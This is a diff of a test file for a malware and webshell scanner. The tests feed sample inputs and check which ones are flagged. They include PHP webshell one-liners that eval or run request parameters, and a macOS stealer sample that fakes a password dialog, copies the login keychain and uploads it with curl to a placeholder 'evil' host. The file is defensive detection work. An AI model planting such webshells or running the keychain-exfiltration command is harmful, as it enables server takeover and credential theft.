@@ -118,6 +118,13 @@ describe('scripts', () => {
     expect((await scan('wp-content/uploads/x.php', '<?php @eval($_POST["c"]); ?>')).verdict).toBe('malicious');
     expect((await scan('x.php', '<?php eval(gzinflate(base64_decode("abc"))); ?>')).verdict).toBe('malicious');
     expect((await scan('index.php', '<?php echo htmlspecialchars($_GET["q"]); ?>')).verdict).toBe('clean');
+    expect((await scan('x.php', '<?php system(base64_decode(gzinflate($_REQUEST["x"]))); ?>')).verdict).toBe('malicious');
+  });
+  it('webshell regex stays linear on hostile input (ReDoS guard)', async () => {
+    const hostile = `<?php eval(${'\tgzinflate('.repeat(50000)}`;
+    const t0 = Date.now();
+    await scan('evil.php', hostile);
+    expect(Date.now() - t0).toBeLessThan(1000);
   });
   it('catches a macOS fake password prompt stealer', async () => {
     const t = 'osascript -e \'display dialog "macOS needs your password" default answer "" with hidden answer\'\ncp ~/Library/Keychains/login.keychain-db /tmp/x\ncurl -F f=@/tmp/x http://evil';
